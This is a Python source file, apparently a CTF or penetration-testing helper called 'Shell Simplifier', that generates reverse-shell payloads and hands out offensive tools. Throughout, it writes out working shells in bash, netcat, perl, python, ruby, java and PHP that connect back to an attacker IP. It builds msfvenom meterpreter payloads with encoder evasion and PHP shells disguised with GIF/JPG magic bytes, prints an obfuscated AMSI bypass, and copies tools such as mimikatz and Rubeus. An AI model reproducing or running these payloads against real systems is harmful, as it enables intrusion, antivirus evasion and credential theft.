#!/usr/bin/python3
#developed by YaSsInE
#reverse shells based on pentestmonkey and nishang shells
import re
import subprocess
import colorama
from subprocess import call
import os
from colorama import Fore,Style
import signal
import sys
import socket 
import pyfiglet
#for aes
from Crypto.Cipher import AES
import base64
import readline

#detect ctrl c
def signal_handler(sig, frame):
    print(Fore.GREEN+'\nThank you for using my tool !! See you soon ...')
    sys.exit(0)


def win(ip, port, command):
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=None, shell=True)
    output = process.communicate()   
    print(Fore.RED+50*"-")
    print(Fore.BLUE+command)
    print(Fore.RED+50*"-")
    print(Fore.GREEN+"Payload generated and saved in your working directory !")
    if "windows/meterpreter/reverse_tcp" in command or "windows/x64/meterpreter/reverse_tcp" in command:
        print(Fore.GREEN+50*"-")
        print(Fore.BLUE +"[+] ip: "+str(ip))
        print(Fore.BLUE +"[+] port: "+str(port))
        print(Fore.GREEN+50*"-")


def linux(ip , port):
    command = "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="+str(ip)+" LPORT="+str(port)+" -f elf > lin-shell-"+str(port)+".elf"
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=None, shell=True)
    output = process.communicate()
    print(Fore.GREEN+50*"-")     
    print(Fore.BLUE+command)
    print(Fore.GREEN+50*"-")         
    print(Fore.BLUE +"[+] ip: "+str(ip))
    print(Fore.BLUE +"[+] port: "+str(port))  
    print(Fore.GREEN+50*"-")       
    print(Fore.GREEN+"[+] Payload generated and saved to your working directory !")

def ext(shell):
    ext = ["exe","dll"]
    if shell == "windows/exec" or shell == "windows/x64/exec":
        inp = input(Fore.BLUE+"[+] cmd command to run in the system >> "+Fore.GREEN)
        if str(inp) == "":
            print(Fore.RED+"[-] Command can not be empty !")
            exit(1)
    else:
        inp = ""    
    print(Fore.GREEN+"[+] Please select an extension from the list below:")
    extension = select_item(ext,len(ext))
    return extension,inp

def windows(ip,port,shell):
    if shell == "windows/exec":
        extension ,inp = ext(shell)
        command = "msfvenom -p "+str(shell)+" CMD='"+str(inp)+"' -e x86/shikata_ga_nai -f "+str(extension)+" > win-shell."+str(extension)
        win(ip,port,command)
    elif shell == "windows/x64/exec":
        extension ,inp = ext(shell)
        command = "msfvenom -p "+str(shell)+" CMD='"+str(inp)+"' -f "+str(extension)+" > win-shell."+str(extension)
        win(ip,port,command)
    elif shell == "windows/meterpreter/reverse_tcp":
        extension ,inp = ext(shell)
        command = "msfvenom -p "+str(shell)+" LHOST="+str(ip)+" LPORT="+str(port)+" -e x86/shikata_ga_nai -f "+str(extension)+" > win-shell-"+str(port)+"."+str(extension)
        win(ip,port,command)
    elif shell == "windows/x64/meterpreter/reverse_tcp":
        extension ,inp = ext(shell)
        command = "msfvenom -p "+str(shell)+" LHOST="+str(ip)+" LPORT="+str(port)+" -f "+str(extension)+" > win-shell-"+str(port)+"."+str(extension)
        win(ip,port,command)


def get_path():
    return os.path.abspath(os.getcwd())

def script_path():
    return os.path.dirname(os.path.realpath(__file__))

def print_list(list):
    for i in range(len(list)):
        if i < 9:
            print(Style.BRIGHT+Fore.RED+"[+] --> "+ Style.BRIGHT+Fore.GREEN +str(i+1) +"."+Style.BRIGHT+Fore.BLUE+ "  " + list[i])
        else:
            print(Style.BRIGHT+Fore.RED+"[+] --> "+ Style.BRIGHT+Fore.GREEN +str(i+1) +"."+Style.BRIGHT+Fore.BLUE+ " " + list[i])
    print(Style.BRIGHT+Fore.RED+"[+] --> "+ Style.BRIGHT+Fore.GREEN +str("0") +"."+Style.BRIGHT+Fore.BLUE+ "  exit")
    
def select_item(list, length):
    choise = ""
    print_list(list)
    print(Fore.GREEN+50*"-")    
    #inp = int(input("Enter a number: "))
    inp = input("option >> "+Fore.RED)
    print(Fore.GREEN+50*"-")    
    try:
        res = int(inp)
    except ValueError:
        try:
            float(inp)
        except ValueError:   
            print (Fore.RED+"Please select a number from the list !")
            exit(1)
    try:        
        if res in range(1, length+1):
            res = list[res-1]
            choise = res
        elif res == int(0):
            print(Fore.GREEN+'\nThank you for using my tool !! See you soon ...')
            exit(1)                 
        else:
            print("Invalid input!")
            choise = "invalid"
            exit(1)
        return choise
    except:
        exit(1)


def get_ip():
    interfaces = os.listdir('/sys/class/net/')
    print(Fore.RED+50*"-")
    print(Fore.GREEN+"[+] Please select an interface: "+Fore.GREEN)
    print(Fore.RED+50*"-")    
    choise = select_item(interfaces,len(interfaces))
    command = "ip addr show "+str(choise)+" "
    command += """| grep "\<inet\>" | awk \'{ print $2 }\' | awk -F "/" \'{ print $1 }\'"""
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=None, shell=True)
    output = process.communicate()
    if output[0].decode('UTF-8').strip() == "":
        print(Fore.RED+"[-] There is no ip associated with this interface !")
        exit(1)
    else:    
        return output[0].decode('UTF-8').strip()

def get_port():
    default = "1024"
    print(Fore.GREEN+"Default port = 1024")
    inp = input(Fore.RED+"[+] Enter a port number or leave it by default >> "+Fore.GREEN)
    try:
        if str(inp) == "":
            res = int(default)
        else:            
            res = int(inp)
        if 1 <= res <= 65535:
            print(Fore.GREEN+"Port accepted !")
        else:
            print(Fore.RED+"Port not accepted ! Please try again with a valid port number.")
            print(Fore.RED+"Exiting ...")
            exit(1)
    except ValueError:
        try:
            float(inp)
        except ValueError:
            print (Fore.RED+"Oops ! Only numbers are allowed")
            exit(1)
    try:
        if res:
            return res
    except:
        print(Fore.RED+"Port not accepted ! Please try again with a valid port number.")
        exit(1)
        
def write_to_file(path, data):
    r = open(path,"w")
    r.write(data)
    r.close()

def move_files(os,second,file_name):
    try:
        source_path = script_pt +"/tools/"+str(os)+"/"+str(second)+"/"+str(file_name) 
        dest_path = current_path +"/"+str(file_name)     
        res = subprocess.check_output(["cp", source_path,dest_path])
        print(Fore.GREEN +"[+] The file "+str(file_name)+" has been successful copied to your working directory !")             
    except:  
        print("Make sure to clone the repo from github !")
        print("exiting !!!")           
        exit(1)


def info(type, path, command, ip ,port):
    print(Fore.GREEN + command)
    print(Fore.GREEN+50*"-")    
    print(Fore.BLUE +"[+] ip: "+str(ip))
    print(Fore.BLUE +"[+] port: "+str(port))
    print(Fore.GREEN+50*"-") 
    print(Fore.RED + "[+] Your "+str(type)+" reverse shell has been created and saved to your working directory !")       
    write_to_file(path, command)    

def nc(ip, port): 
    output_file_name = "nc_rev_shell_"+str(port)+".sh"
    save_path = str(current_path)+"/"+output_file_name         
    command = "#!/bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "+str(ip)+" "+str(port)+" >/tmp/f\n"
    info("nc", save_path, command, ip, port)

def bash(ip, port): 
    output_file_name = "bash_rev_shell_"+str(port)+".sh"
    save_path = str(current_path)+"/"+output_file_name         
    command = "#!/bin/bash\nbash -i >& /dev/tcp/"+str(ip)+"/"+str(port)+" 0>&1\n"
    info("bash", save_path, command, ip, port)

def perl(ip, port):
    output_file_name = "perl_rev_shell_"+str(port)+".pl"
    save_path = str(current_path)+"/"+output_file_name     
    command = "perl -e 'use Socket;"
    command += '$i="'+str(ip)+'";'
    command += "$p="+str(port)+";"
    command += 'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
    command += 'if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");'
    command += 'open(STDERR,">&S");exec("/bin/sh -i");};'
    command += "'\n"
    print(Fore.GREEN+command+"\n")
    print(Fore.GREEN+50*"-")
    print(Fore.BLUE +"[+] ip: "+str(ip))
    print(Fore.BLUE +"[+] port: "+str(port))
    print(Fore.GREEN+50*"-")    
    print(Fore.RED + "[+] Your perl reverse shell has been created !")    

def python(ip, port):
    command = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
    command += 's.connect(("'+str(ip)+'",'+str(port)+'));'
    command += 'os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    command += "'\n"
    print(Fore.GREEN+command+"\n")
    print(Fore.RED + "[+] Your python reverse shell has been created !")
    print(Fore.GREEN+50*"-")
    print(Fore.BLUE +"[+] ip: "+str(ip))
    print(Fore.BLUE +"[+] port: "+str(port))
    print(Fore.GREEN+50*"-")    

def simple_php(ip, port, id):
    output_file_name = "simple_php_shell_"+str(port)+".php"
    command = "<?php\n"
    command += 'exec("/bin/bash -c '
    command += "'bash -i >& /dev/tcp/"+str(ip)+"/"+str(port)+" 0>&1'"
    command += '");\n?>\n'
    if id =="ret":
        return command
    print(Fore.GREEN + command)
    save_path = str(current_path)+"/"+output_file_name
    write_to_file(save_path, command)
    print(Fore.RED + "[+] Your simple php reverse shell has been created !")

def ruby(ip, port):
    output_file_name = "ruby_rev_shell_"+str(port)+".rb"
    save_path = str(current_path)+"/"+output_file_name    
    command = "ruby -rsocket -e'f=TCPSocket.open"
    command += '("'+str(ip)+'",'+str(port)+').to_i;'
    command += 'exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
    command += "'\n"
    info("ruby", save_path, command, ip, port)

def java(ip, port):
    output_file_name = "java_rev_shell_"+str(port)+".java"
    save_path = str(current_path)+"/"+output_file_name     
    command = "r = Runtime.getRuntime()\n"
    command += 'p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/'+str(ip)+'/'+str(port)+';cat <&5 | while read line; do \$line 2>&5 >&5;' 
    command += 'done"] as String[])\n'
    command += 'p.waitFor()\n'
    print(Fore.GREEN+command+"\n")
    print(Fore.GREEN+50*"-")    
    print(Fore.BLUE +"[+] ip: "+str(ip))
    print(Fore.BLUE +"[+] port: "+str(port))
    print(Fore.GREEN+50*"-")     
    print(Fore.RED + "[+] Your java reverse shell has been created !")

def gif(ip,port,id):
    magic = "GIF89a;\n"
    if id == "simple":
        output_file_name = "magic_simple_"+str(port)+".php.gif"        
        php_code = simple_php(ip,port,"ret")
    elif id == "full":    
        output_file_name = "magic_full_"+str(port)+".php.gif"        
        php_code = full_php(ip,port,"ret")
    save_path = str(current_path)+"/"+output_file_name       
    final_data = magic + php_code
    write_to_file(save_path, final_data)
    print(Fore.GREEN +"[+] ip: "+str(ip))
    print(Fore.GREEN +"[+] port: "+str(port))    
    print(Fore.RED + "[+] Your gif reverse shell has been created !")    

def jpg(ip,port,id):
    magic = """\xff\xd8\xff\xdb\n"""
    if id == "simple":
        output_file_name = "magic_simple_"+str(port)+".php.jpg"        
        php_code = simple_php(ip,port,"ret")
    elif id == "full":
        output_file_name = "magic_full_"+str(port)+".php.jpg"        
        php_code = full_php(ip,port,"ret")    
    save_path = str(current_path)+"/"+output_file_name       
    final_data = magic + php_code
    write_to_file(save_path, final_data)
    print(Fore.GREEN+50*"-")     
    print(Fore.BLUE +"[+] ip: "+str(ip))
    print(Fore.BLUE +"[+] port: "+str(port))
    print(Fore.GREEN+50*"-")        
    print(Fore.RED + "[+] Your jpg reverse shell has been created !")

def full_php(ip,port,id):
    readed_data = ""
    output_file_name = "php_rev_shell_"+str(port)+".php"
    string = "<?php\n"
    string += "set_time_limit (0);\n"
    string += '$VERSION = "1.0";\n'
    string += "$ip = '"+str(ip)+"';\n"
    string += "$port = "+str(port)+";\n"
    full_path = str(script_pt)+"/tools/linux/shell/php_rev_shell.php"
    try:
        with open(full_path, 'r') as infile:
            for myline in infile:
                readed_data += myline      
    except IOError:
        print ("error opening file")
    #print(string + readed_data)
    final_data = string + readed_data
    if id =="ret":
        return final_data
    save_path = str(current_path)+"/"+output_file_name
    write_to_file(save_path, final_data)
    print(Fore.GREEN+50*"-")    
    print(Fore.BLUE +"[+] ip: "+str(ip))
    print(Fore.BLUE +"[+] port: "+str(port))  
    print(Fore.GREEN+50*"-")      
    print(Fore.RED + "[+] Your php reverse shell has been created !")

def nishang(ip,port):
    readed_data = ""
    final_data =""
    output_file_name = "nishang_"+str(port)+".ps1"    
    full_path = str(script_pt)+"/tools/windows/shell/nishang.ps1"
    try:
        with open(full_path, 'r') as infile:
            for myline in infile:
                readed_data += myline      
    except IOError:
        print ("error opening file")
    command = "Power -Reverse -IPAddress "
    command += str(ip)+" "
    command += "-Port "+str(port)+"\n"
    final_data = readed_data + command
    save_path = str(current_path)+"/"+output_file_name
    write_to_file(save_path, final_data)
    print(Fore.GREEN+50*"-")    
    print(Fore.BLUE +"[+] ip: "+str(ip))
    print(Fore.BLUE +"[+] port: "+str(port))
    print(Fore.GREEN+50*"-")         
    print(Fore.RED + "[+] Your nishang shell has been created and saved in your working directory !") 


def rce_shell():
    readed_data = ""
    full_path = str(script_pt)+"/tools/linux/shell/cmdshell.py"
    output_file_name = "rce_cmd.py"
    try:
        with open(full_path, 'r') as infile:
            for myline in infile:
                readed_data += myline      
    except IOError:
        print ("error opening file")
    #print(string + readed_data)
    save_path = str(current_path)+"/"+output_file_name
    write_to_file(save_path, readed_data)
    print(Fore.GREEN + "[+] The cmd python code has been copied to your working directory !")
    print(Fore.GREEN + "[+] run: python3 rce_cmd.py")

def clear(): 
    # check and make call for specific operating system 
    _ = call('clear' if os.name =='posix' else 'cls')

def aes():
    try:
        BLOCK_SIZE = 16
        pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)
        unpad = lambda s: s[:-ord(s[len(s) - 1:])]
        key = input("key >> ")
        iv = input("iv >> ")
        cypher = input("cypher >> ")
        decryption_suite = AES.new(key, AES.MODE_CBC, iv)
        plain_text = unpad(decryption_suite.decrypt(base64.b64decode(cypher)))
        plain_text = str(plain_text.decode("utf-8"))
        if plain_text:
            print(Fore.GREEN +"Decoded data: "+plain_text)
        else:
            print(Fore.RED+"Please make sure that you are using the correct IV and Key !")    
    except:
        if signal.signal(signal.SIGINT, signal_handler):
            return '0'  
        else:      
            print(Fore.RED + "Oops !! One or more inputs are incorrect")

def amsi():
    string = """sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )"""
    print(Fore.RED+"Paste this string into powershell: \n\n"+Fore.GREEN +string+"\n")

script_pt = script_path()
current_path = get_path()

os_list = ["Windows","Linux","magic bytes reverse shell for linux","AES 256 mode_cbc base64 decoder","AMSI powershell bypass","Bruteforce template"]
main_list_windows = ["generate shell","enum tools","windows tools"]
main_list_linux = ["generate shell","tools and enumeration scripts"]
windows_shells = ["nishang shell","windows/exec","windows/x64/exec","windows/meterpreter/reverse_tcp","windows/x64/meterpreter/reverse_tcp","php cmd web shell","aspx cmd web shell"]
linux_shell = ["bash","nc","simple php","full php","python","perl","rce shell","ruby","java","linux/x86/meterpreter/reverse_tcp"]
linux_tools = ["LinEnum.sh","linpeas.sh","lse.sh","nc","pspy64","pwncat"]
windows_enum = ["jaws.ps1","PowerUp.ps1","Sherlock.ps1","winPEAS.bat","wp.exe"]
windows_tools =["accesschk.exe","curl.exe","nc.exe","powerview.ps1","wget.exe","base64.exe","dumpcap.exe","powercat.ps1","procdump64.exe","chisel86.exe","juicy.exe","powermad.ps1","Rubeus.exe","cmd.exe","mimikatz64.exe","powershell.exe","SharpHound.exe"]
magic_bytes = ["jpg simple php magic bytes","jpg full php magic bytes","gif simple php magic bytes","gif full php magic bytes"]
template = ["python","php"]
template_size = len(template)
magic_bytes_size = len(magic_bytes)
windows_tools_size = len(windows_tools)
windows_enum_size = len(windows_enum)
linux_tools_size = len(linux_tools)
linux_shell_size = len(linux_shell)
windows_shells_size = len(windows_shells)
main_list_windows_size = len(main_list_windows)
main_list_linux_size = len(main_list_linux)
os_list_size = len(os_list)

ascii_banner = pyfiglet.figlet_format("Shell Simplifier !")
author = "\n\t\t\t\t\t\t\tby YaSsInE\n\n"
contact1 = "\t\tWebsite    : https://0xyassine.github.io\n"
contact2 = "\t\tHackTheBox : https://www.hackthebox.eu/profile/143843\n"

clear()
print(Fore.RED + ascii_banner+author+contact1+contact2)


signal.signal(signal.SIGINT, signal_handler)


os_item = select_item(os_list, os_list_size)
if os_item == "Windows":
    main_item = select_item(main_list_windows, main_list_windows_size)
    if main_item == "generate shell":
        windows_item = select_item(windows_shells, windows_shells_size)
        if windows_item == "nishang shell":
            ip = get_ip()
            port = get_port()
            nishang(ip, port)
        elif windows_item == "windows/exec":
            windows("0", "0", windows_item)   
        elif windows_item == "windows/x64/exec":
            windows("0", "0", windows_item)  
        elif windows_item == "windows/meterpreter/reverse_tcp":
            ip = get_ip()
            port = get_port()
            windows(ip, port, windows_item) 
        elif windows_item == "windows/x64/meterpreter/reverse_tcp":
            ip = get_ip()
            port = get_port()
            windows(ip, port, windows_item)                                            
        elif windows_item == "php cmd web shell":
            move_files("windows","shell","windows_cmd.php")   
        elif windows_item == "aspx cmd web shell":
            move_files("windows","shell","windows_cmd.aspx")             
        else:
            exit(1)
    elif main_item == "enum tools":
        windows_enum_item = select_item(windows_enum, windows_enum_size)
        if windows_enum_item == "jaws.ps1":
            move_files("windows","enum",windows_enum_item)
            print("Usage: .\jaws.ps1 -OutputFilename enum.txt")
        elif windows_enum_item == "PowerUp.ps1":
            move_files("windows","enum",windows_enum_item)
            print(Fore.BLUE+100*"-")
            print(Fore.RED+"Usage: Import-Module .\PowerUp.ps1")
            print(Fore.RED+"       Invoke-AllChecks")
            print(Fore.BLUE+100*"-")
        elif windows_enum_item == "Sherlock.ps1":
            move_files("windows","enum",windows_enum_item)
        elif windows_enum_item == "winPEAS.bat":
            move_files("windows","enum",windows_enum_item)            
        elif windows_enum_item == "wp.exe":
            move_files("windows","enum",windows_enum_item)
            print(Fore.BLUE+100*"-")
            print(Fore.RED+"Usage: .\wp.exe --audit -A -e -f -I -o report")
            print(Fore.BLUE+100*"-")
    elif main_item == "windows tools":
        windows_tools_item = select_item(windows_tools, windows_tools_size)
        if windows_tools_item == "accesschk.exe":
            move_files("windows","tools",windows_tools_item)
        elif windows_tools_item == "curl.exe":
            move_files("windows","tools",windows_tools_item)
        elif windows_tools_item == "nc.exe":
            move_files("windows","tools",windows_tools_item)   
        elif windows_tools_item == "powerview.ps1":
            move_files("windows","tools",windows_tools_item)                             
        elif windows_tools_item == "wget.exe":
            move_files("windows","tools",windows_tools_item) 
        elif windows_tools_item == "base64.exe":
            move_files("windows","tools",windows_tools_item)
        elif windows_tools_item == "dumpcap.exe":
            move_files("windows","tools",windows_tools_item)                        
        elif windows_tools_item == "powercat.ps1":
            move_files("windows","tools",windows_tools_item)
        elif windows_tools_item == "procdump64.exe":
            move_files("windows","tools",windows_tools_item)            
        elif windows_tools_item == "chisel86.exe":
            move_files("windows","tools",windows_tools_item)
        elif windows_tools_item == "juicy.exe":
            move_files("windows","tools",windows_tools_item)
        elif windows_tools_item == "powermad.ps1":
            move_files("windows","tools",windows_tools_item)
        elif windows_tools_item == "Rubeus.exe":
            move_files("windows","tools",windows_tools_item)            
        elif windows_tools_item == "cmd.exe":
            move_files("windows","tools",windows_tools_item)
        elif windows_tools_item == "mimikatz64.exe":
            move_files("windows","tools",windows_tools_item)
        elif windows_tools_item == "powershell.exe":
            move_files("windows","tools",windows_tools_item)
        elif windows_tools_item == "SharpHound.exe":
            move_files("windows","tools",windows_tools_item)                                      
elif os_item == "Linux":
    main_item = select_item(main_list_linux, main_list_linux_size)
    if main_item == "generate shell":
        ip = get_ip()
        port = get_port()    
        linux_item = select_item(linux_shell, linux_shell_size)
        if linux_item == "bash":
            bash(ip, port)
        elif linux_item == "nc":
            nc(ip, port)            
        elif linux_item == "simple php":
            simple_php(ip, port,"")
        elif linux_item == "full php":
            full_php(ip, port,"")
        elif linux_item == "python":
            python(ip, port)   
        elif linux_item == "perl":
            perl(ip, port)
        elif linux_item == "ruby":
            ruby(ip, port)
        elif linux_item == "java":
            java(ip, port) 
        elif linux_item == "rce shell":
            rce_shell()
        elif linux_item == "linux/x86/meterpreter/reverse_tcp":
            linux(ip, port)    
        else:
            exit(1)
    elif main_item == "tools and enumeration scripts":
        linux_tools_item = select_item(linux_tools, linux_tools_size)
        if linux_tools_item == "LinEnum.sh":
            move_files("linux","enum",linux_tools_item)
        elif linux_tools_item =="linpeas.sh":
            move_files("linux","enum",linux_tools_item)
        elif linux_tools_item =="lse.sh":
            move_files("linux","enum",linux_tools_item)
        elif linux_tools_item =="nc":
            move_files("linux","enum",linux_tools_item)                        
        elif linux_tools_item =="pspy64":
            move_files("linux","enum",linux_tools_item)
        elif linux_tools_item =="pwncat":
            move_files("linux","enum",linux_tools_item)            
        else:
            exit(1)
elif os_item == "magic bytes reverse shell for linux":
    magic_item = select_item(magic_bytes, magic_bytes_size)
    ip = get_ip()
    port = get_port()      
    if magic_item == "jpg simple php magic bytes":        
        jpg(ip, port,"simple")
    elif magic_item == "jpg full php magic bytes":
        jpg(ip, port,"full")
    if magic_item == "gif simple php magic bytes":        
        gif(ip, port,"simple")
    elif magic_item == "gif full php magic bytes":
        gif(ip, port,"full")                               
elif os_item == "AES 256 mode_cbc base64 decoder":
    aes()        
elif os_item == "AMSI powershell bypass":
    amsi()
elif os_item == "Bruteforce template":
    template_item = select_item(template, template_size)
    if template_item == "python":
        move_files("template","python","brute.py")
    elif template_item == "php":
        move_files("template","php","brute.php")